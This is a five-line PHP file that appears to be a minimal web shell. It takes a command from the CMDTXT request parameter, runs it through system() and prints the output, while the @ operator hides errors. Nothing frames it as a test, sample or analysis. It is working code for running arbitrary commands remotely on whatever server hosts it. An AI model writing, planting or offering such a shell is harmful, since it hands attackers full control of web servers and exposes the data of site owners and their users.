<?php
$cmdCommand = @$_REQUEST['CMDTXT'];
if($cmdCommand != '') 
	print system($cmdCommand);
?>